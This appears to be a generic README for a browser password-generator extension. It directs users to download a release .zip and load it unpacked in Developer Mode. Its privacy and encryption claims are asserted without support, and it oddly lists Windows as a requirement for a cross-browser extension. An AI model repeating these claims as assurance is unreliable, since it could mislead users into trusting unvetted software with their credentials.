# 🔐 ZPassword-Extension - Secure passwords generated for your browser

[![Download ZPassword-Extension](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/vroomfalsification798/ZPassword-Extension/releases)

ZPassword-Extension helps you manage passwords. It creates strong passwords for your accounts. It saves your settings for each website. It fills password forms for you. The software runs locally on your computer. It uses encryption to protect your data. You do not need an account to use it. It does not track your activity.

## 📦 What this tool does

This extension simplifies password management. You open your browser and the tool provides a password. It remembers your preferences for every site. It fills out the login form automatically. You can choose to save your password history. This history stays encrypted on your device. You can retrieve old passwords when you need them. The tool works with Chromium browsers like Chrome, Edge, and Brave. It also works with Firefox.

## ⚙️ System requirements

- A web browser like Google Chrome, Microsoft Edge, or Mozilla Firefox.
- A Windows computer.
- Basic knowledge of how to install browser extensions.

## 📥 How to download and install

Follow these steps to add the extension to your browser.

1. Visit the [Releases page](https://github.com/vroomfalsification798/ZPassword-Extension/releases) to download the latest version.
2. Look for the file ending in `.zip` or the source code folder.
3. Download this file to your computer.
4. Open your browser settings.
5. Navigate to the Extensions menu.
6. Enable Developer Mode. This setting is usually in the top right corner.
7. Click the button labeled Load unpacked.
8. Select the folder where you extracted the extension files.
9. The extension will appear in your browser toolbar.

## 🔑 Using the extension

Click the extension icon in your browser toolbar to start. The main window shows a generated password. You can adjust the length of the password. You can toggle symbols, numbers, and uppercase letters. The extension remembers these settings for the website you visit. Click the fill button to put the password into the form.

## 🛡️ Privacy and security

The extension prioritizes your privacy. It uses industry-standard encryption methods. All encryption happens inside your browser. Your passwords never leave your computer. The extension does not connect to any servers. It does not send information to third parties. You have full control over your data. Because it uses no outside services, it works without an internet connection.

## 📁 Encrypted history

You can enable the history feature in the settings menu. This creates a secure record of your passwords. The history is encrypted with a key only you possess. You can search your history to find an old password. If you disable the history feature, the extension deletes the data from your computer.

## 🛠️ Frequently asked questions

**Does this extension save my passwords to a cloud server?**
No. It saves everything locally on your hard drive.

**Can I use this extension on multiple computers?**
You must install it and manage your settings on each computer individually.

**What happens if I forget my master password?**
You cannot recover your data if you lose your encryption key. Store this key in a safe place.

**Is this extension free?**
Yes. The project uses the GPLv3 license.

**How does the extension stay secure?**
It uses web crypto standards. It relies on vanilla JavaScript to avoid external risks.

**Can I inspect the code?**
Yes. The repository is open for anyone to review.
